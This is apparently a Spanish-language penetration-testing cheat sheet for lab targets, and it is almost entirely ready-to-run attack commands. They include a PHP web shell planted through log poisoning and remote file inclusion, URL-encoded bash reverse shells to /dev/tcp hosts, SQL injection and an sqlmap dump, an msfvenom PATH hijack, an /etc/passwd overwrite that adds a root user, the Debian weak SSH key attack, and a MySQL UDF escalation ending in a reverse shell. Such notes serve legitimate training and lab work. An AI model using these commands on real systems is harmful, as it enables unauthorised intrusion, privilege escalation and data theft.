**\- Buscar SUID**

find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;
find / -uid 0 -perm -4000 -type f 2>/dev/null

**\- Archivos modificas hace 10 min**
find / \-mmin \-10 2\>/dev/null \| grep \-Ev "^/proc"

**\- Archivo que se puede editar**

find / -writable ! -user \\\`whoami\\\` -type f ! -path "/proc/\*" ! -path "/sys/\*" -exec ls -al {} \\; 2>/dev/null
find / -perm -2 -type f 2>/dev/null
find / ! -path "\*/proc/\*" -perm -2 -type f -print 2>/dev/null

**\- Find SUID**
find / -perm -u=s -type f 2>/dev/null

**\- Find GUID**
find / -perm -g=s -type f 2>/dev/null

**\- Archivos ocultos**
find / -name ".\*" -print 2>/dev/null

**\- Envenenamiento de logs con LFI to RCE**
nc -nv 192.168.139.52 80
<?php echo '\<pre>' . shell\_exec($\_GET['cmd']) . '\</pre>';?>
{url}/menu.php?file=/var/log/apache2/access.log&cmd=id
**\- para hacer un revershell toca encodear el comando\, ejemplo**
/bin/bash -c 'bash -i > /dev/tcp/192.168.119.239/5555 0>%261' --->>>> %2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%31%39%2e%32%33%39%2f%35%35%35%35%20%30%3e%25%32%36%31%27
\- se puede hacer por User Agent: tambien
**\- hacer shell interactiva**
python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z
stty raw -echo;fg
reset
terminal type? xterm
stty rows 40 columns 184
**\- RFI**
se debe crear un archivo en el atacante
└─# cat evil.txt.php 1 ⨯
<?php echo shell\_exec($\_GET['cmd']);?>
se ejecuta desde la victima
http://192.168.239.10/menu.php?file=http://192.168.119.239/evil.txt.php&cmd=ipconfig

\- Sticktbit
chmod 4755 /bin/bash
/bin/bash -p

**\- SQLI**
--identificar columnas
?id=1 GROUP BY 5--+
--identificar campos vulnerables
?id=1 UNION select 1,2,3,4,5
\-\- extraer informacion
UNION select 1,2,group\_concat(password),4,5 FROM users
--automatizado
sqlmap -u "http://192.168.239.52/debug.php?id=1" -p"id" --dbms=sqlite --dump

**\- Path Inyection**
msfvenom -p linux/x86/exec CMD=/bin/sh -f elf -o scp
se carga este archivo en bob mediante python -m ......
se desarga en bob
wget http://ip/scp
chmod 755 scp
export path=/home/bob:$PATH
/usr/local/bin/uploadtosecure
bob@sufferance:\~$ /usr/local/bin/uploadtosecure

**\- Escape rbash**
vi -> :set shell=/bin/bash
/bin/bash
export PATH=/bin:/usr/bin:$PATH
export SHELL=/bin/bash:$SHELL

<br>
**\- Permisos de passwd para escribir**
openssl passwd -1 -salt ignite pass123
echo 'ignite:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/bin/bash' > /etc/passwd

<br>
**\- Identificacion de smb**
https://fareedfauzi.gitbook.io/oscp-notes/services-enumeration/smb
./smbver.sh 10.11.1.115 139
10.11.1.115: UnixSamba 227a

<br>
**\- Ataque fuerza bruta ssh \- authorized\_key**
https://github.com/g0tmi1k/debian-ssh
se procede a realizar lo que se pide en la documentacion
git clone https://github.com/g0tmi1k/debian-ssh
cd debian-ssh/common\_keys
bunzip2 debian\_ssh\_dsa\_1024\_x86.tar.bz2
tar -xvf debian\_ssh\_dsa\_1024\_x86.tar
cd dsa/1024
cat authorized\_key
grep -lr 'AAAAB3NzaC1kc3MAAACBAOgzzMCD3Im5bRnAVdV3yLwTsyNAi3'
f1fb2162a02f0f7c40c210e6167f05ca-16858.pub === publica donde esta la authorized\_key
se procede a hacer ssh
ssh -i f1fb2162a02f0f7c40c210e6167f05ca-16858 -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-dss bob@10.11.1.136

<br>
<br>
**\- Mysql**
mysql -u root -p
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load\_file('/home/raptor/raptor\_udf2.so'));
mysql> select \* from foo into dumpfile '/usr/lib/raptor\_udf2.so';
mysql> create function do\_system returns integer soname 'raptor\_udf2.so';
mysql> select \* from mysql.func;
+-----------+-----+----------------+----------+
\| name \| ret \| dl \| type \|
+-----------+-----+----------------+----------+
\| do\_system \| 2 \| raptor\_udf2\.so \| function \|
+-----------+-----+----------------+----------+
1 row in set (0.00 sec)

<br>
select do\_system(' bash -c 'exec bash -i &>/dev/tcp/192.168.119.184/80 <&1'');






script /dev/null -c bash







